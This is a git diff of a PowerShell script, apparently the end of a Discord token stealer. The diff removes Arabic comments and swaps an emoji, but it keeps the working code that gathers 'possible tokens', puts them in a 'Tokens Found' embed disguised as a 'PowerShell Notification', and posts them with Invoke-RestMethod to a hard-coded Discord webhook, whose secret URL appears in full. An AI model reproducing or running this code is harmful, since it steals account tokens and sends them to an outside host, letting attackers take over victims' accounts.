@@ -195,11 +195,11 @@ Write-Output $possibleTokens
 # عنوان الويب هوك الخاص بك
 $webhook_url = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7"
 
-# إعداد الـ Embed
+
 $embed = @{
     title = "🚀 PowerShell Notification"
     description = "A message has been sent with a [clickable link](https://discord.com)!"
-    color = 5814783  # كود اللون بالأحمر الداكن مثلاً
+    color = 5814783
     fields = @(
         @{
             name = "📦 Tokens Found"
@@ -207,7 +207,7 @@ $embed = @{
             inline = $false
         },
         @{
-            name = "📎 Link Example"
+            name = "🔗 Link Example"
             value = "[Open Discord](https://discord.com)"
             inline = $true
         }
@@ -220,13 +220,12 @@ $embed = @{
     }
 }
 
-# إعداد الـ Payload النهائي
 $payload = @{
     username = "🔔 Notification Bot"
     avatar_url = "https://i.imgur.com/Z4mB6rL.png"
     embeds = @($embed)
 } | ConvertTo-Json -Depth 5
 
-# إرسال الطلب
 Invoke-RestMethod -Uri $webhook_url -Method Post -Body $payload -ContentType 'application/json'
+
 
